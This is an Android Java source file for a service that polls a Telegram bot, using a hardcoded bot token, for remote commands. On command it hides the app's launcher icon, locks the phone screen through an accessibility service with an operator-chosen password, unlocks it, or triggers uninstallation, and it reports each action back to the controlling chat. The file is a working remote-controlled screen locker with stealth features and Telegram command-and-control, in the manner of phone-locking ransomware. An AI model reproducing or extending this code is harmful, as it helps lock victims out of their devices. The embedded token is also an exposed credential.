package com.example.touchlock;

import android.app.*;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.*;
import okhttp3.*;
import org.json.*;
import java.util.concurrent.TimeUnit;

public class TouchLockService extends Service {
    public static TouchLockService instance;
    private static final String BOT_TOKEN = "8388799545:AAGPwGKOTs47C29s6PUDFsqZbAjNh9wdrgE";
    private OkHttpClient client;
    private long lastUpdateId = 0;
    private String adminChatId = ""; 

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build();
        
        createNotificationChannel();
        startForeground(1, getMyNotification("Система активна"));
        startPolling();
    }

    private void startPolling() {
        new Thread(() -> {
            boolean isFirstRun = true;
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    Response response = client.newCall(new Request.Builder().url(url).build()).execute();
                    
                    if (response.isSuccessful() && response.body() != null) {
                        JSONObject json = new JSONObject(response.body().string());
                        JSONArray results = json.getJSONArray("result");
                        
                        if (results.length() > 0) {
                            // Берем ID последнего сообщения
                            JSONObject lastObj = results.getJSONObject(results.length() - 1);
                            lastUpdateId = lastObj.getLong("update_id");

                            // При первом запуске отправляем сигнал активности
                            if (isFirstRun) {
                                adminChatId = lastObj.getJSONObject("message").getJSONObject("chat").getString("id");
                                sendTelegramMessage("✅ Бот активен и готов к работе!");
                                isFirstRun = false;
                            }

                            // Обработка всех пришедших сообщений
                            for (int i = 0; i < results.length(); i++) {
                                JSONObject msg = results.getJSONObject(i).getJSONObject("message");
                                String text = msg.optString("text", "");
                                String[] parts = text.split(" ");
                                String cmd = parts[0].toLowerCase();
                                new Handler(Looper.getMainLooper()).post(() -> handleCommand(cmd, parts));
                            }
                        }
                    }
                } catch (Exception e) {
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }).start();
    }

    private void handleCommand(String cmd, String[] parts) {
        if (cmd.equals("/hide")) {
            updateIconStatus(false);
            sendTelegramMessage("👻 Иконка скрыта");
        } else if (cmd.equals("/show")) {
            updateIconStatus(true);
            sendTelegramMessage("👁 Иконка возвращена");
        } else if (cmd.equals("/killme")) {
            sendTelegramMessage("💀 Подготовка к удалению...");
            updateIconStatus(true);
            if (TouchLockAccessibilityService.instance != null) TouchLockAccessibilityService.instance.unlock();
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(android.net.Uri.parse("package:" + getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            stopSelf();
        } else if (TouchLockAccessibilityService.instance != null) {
            if (cmd.equals("/block")) {
                String pass = (parts.length > 1) ? parts[1] : "0000";
                TouchLockAccessibilityService.instance.lock(pass);
                sendTelegramMessage("🔒 Экран заблокирован. Пароль: " + pass);
            } else if (cmd.equals("/stop")) {
                TouchLockAccessibilityService.instance.unlock();
                sendTelegramMessage("🔓 Разблокировано");
            }
        }
    }

    public void sendTelegramMessage(String message) {
        if (adminChatId.isEmpty()) return;
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + adminChatId + "&text=" + message;
                client.newCall(new Request.Builder().url(url).build()).execute();
            } catch (Exception ignored) {}
        }).start();
    }

    private void updateIconStatus(boolean show) {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        int newState = show ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
        if (getPackageManager().getComponentEnabledSetting(componentName) != newState) {
            getPackageManager().setComponentEnabledSetting(componentName, newState, PackageManager.DONT_KILL_APP);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel("TouchLockChannel", "Status", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private Notification getMyNotification(String t) {
        return new Notification.Builder(this, "TouchLockChannel")
                .setContentTitle("Touch Blocker")
                .setContentText(t)
                .setSmallIcon(android.R.drawable.ic_secure)
                .setOngoing(true)
                .build();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public IBinder onBind(Intent intent) { return null; }
    @Override public void onDestroy() { instance = null; super.onDestroy(); }
}
